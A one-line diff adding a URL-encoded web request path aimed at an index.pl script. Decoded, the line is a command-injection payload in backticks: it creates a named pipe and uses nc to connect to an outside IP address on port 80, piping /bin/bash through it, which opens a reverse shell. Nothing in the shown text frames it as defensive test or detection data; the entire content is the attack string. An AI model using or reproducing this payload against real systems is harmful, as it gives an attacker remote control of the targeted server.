@@ -1,0 +1,1 @@
+/index.pl?%60mknod%20backpipe%20p%20%26%26%20nc%2034.200.157.80%2080%200%3Cbackpipe%20%7C%20%2Fbin%2Fbash%201%3Ebackpipe%26%60
